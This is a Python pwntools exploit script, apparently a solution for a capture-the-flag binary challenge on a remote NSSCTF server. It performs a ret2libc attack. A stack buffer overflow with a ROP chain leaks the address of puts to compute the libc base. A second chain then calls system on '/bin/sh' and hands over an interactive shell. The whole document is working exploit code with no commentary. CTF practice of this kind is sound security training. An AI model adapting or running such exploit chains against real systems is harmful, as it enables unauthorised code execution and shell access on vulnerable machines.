from pwn import *

context.log_level = "debug"
context.update(arch="amd64", os="linux")
context.terminal = ["qterminal", "-e"]
p = remote("node5.anna.nssctf.cn", 28286)
# p = process("./PWN1")
# gdb.attach(p, "b* 0x0400AD1")
ret = p64(0x400C84)
rdi_ret = 0x400C83
p.recvuntil("machine")
# pause()
p.sendline("1")
puts = p64(0x4006E0)
sleep(0.1)
padding = b"a" * 0x58
# pause()
payload = padding + p64(rdi_ret) + p64(0x602020) + puts + p64(0x0400B28)
p.sendline(payload)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
addr = puts_addr- 0x0809C0
log.info("libc addr= %#x" % (addr))
sleep(0.1)
# pause()
p.sendline("1")
sleep(0.1)
payload = padding +ret+ p64(rdi_ret) + p64(addr+0x1b3e9a) + p64(addr+0x04f440)
p.sendline(payload)
p.interactive()
